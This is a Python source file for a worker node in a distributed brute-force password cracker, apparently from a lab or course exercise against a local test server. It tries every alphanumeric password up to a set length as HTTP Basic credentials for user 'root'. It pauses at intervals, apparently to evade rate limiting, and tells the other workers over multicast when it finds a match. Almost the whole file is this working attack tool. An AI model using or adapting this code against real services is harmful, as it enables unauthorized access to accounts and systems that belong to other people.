import time
import socket
import json
import base64
import struct
from server import const
from string import ascii_letters, digits
from itertools import product
import itertools

class Slave:
    def __init__(self):
        self.port = 8000
        self.host = '172.17.0.2'
        self.slaves=[]
        self.n_slaves=1

        self.MCAST_GRP = '224.1.1.1'
        self.MCAST_PORT = 5007
        self.MULTICAST_TTL = 2

    def connect(self):    
        #All sockets connect to host server
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))
        print("Connected to" , self.host,":",self.port, " in ", self.sock)

        """SOCKETS MULTICAST DE ENVIO"""
        #All sockets connect to each other
        self.sock_sendMulticast = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        self.sock_sendMulticast.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MULTICAST_TTL)
        reg_msg = json.dumps({"command":"register"}).encode('utf-8')

        self.sock_sendMulticast.sendto(reg_msg, (self.MCAST_GRP, self.MCAST_PORT))

    def encode(self,password) -> str:
        string_pass = ('root:' + password).encode('utf-8')
        pass_64 = base64.b64encode(string_pass).decode('utf-8')
        return pass_64

    def send_msg(self, msg,conn):
            conn.send(msg)

    def recv_slave(self):
            """create multicast sockets to receivedata"""
            self.sock_recvMulti = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            self.sock_recvMulti.settimeout(0)                
            self.sock_recvMulti.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock_recvMulti.bind(('', self.MCAST_PORT))

            mreq = struct.pack("4sl", socket.inet_aton(self.MCAST_GRP), socket.INADDR_ANY)

            self.sock_recvMulti.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        
        
    def cartesianeProd(self, length):
        listinha = []
        for i in range(1, length + 1):
            for comb in itertools.product(ascii_letters + digits , repeat = i):
                tmp = ''
                for i in range(len(comb)):
                    tmp += comb[i]
                listinha.append(tmp)
        return listinha
    
    def loop(self):
        self.recv_slave()
        time.sleep(5)
        comb = self.cartesianeProd(const.PASSWORD_SIZE)
        i=0
        while True:
            """HTTP protocol and turn sockets on"""
            try:
                json_msg = self.sock_recvMulti.recv(10240).decode('utf-8')
                message = json.loads(json_msg)
                if message['command'] == 'register':
                    self.n_slaves+=1
                    print("Number slaves:" ,self.n_slaves)
                elif message['command'] == 'match':
                    print(message)
                    break
            except socket.error:
                pass
                    
            self.msg = "GET / HTTP/1.1\nHost: " + self.host + " : " + str(self.port) + "\n"
            self.msg += "Authorization: Basic " + str(self.encode(comb[i])) + "\n\n"
            self.send_msg(self.msg.encode('utf-8'),self.sock)
                
            received = self.sock.recv(1024).decode('utf-8')

            if "OK" in received:
                msg_ok = {'command': 'match', 'password': comb[i]}
                msg_ok_encode = json.dumps(msg_ok).encode('utf-8')
                self.sock_sendMulticast.sendto(msg_ok_encode, (self.MCAST_GRP, self.MCAST_PORT))
                print(msg_ok)
                break
            elif (received[-1] == "\n"):
                data_recv = self.sock.recv(1024).decode('utf-8')
                received += data_recv
            print("Trying... ", comb[i])
            i += 1
            if (i%const.MIN_TRIES == 0 and i != 0):
                time.sleep((const.COOLDOWN_TIME/1000)%60)
            
if __name__ == "__main__":
    s = Slave()
    s.connect()
    s.loop()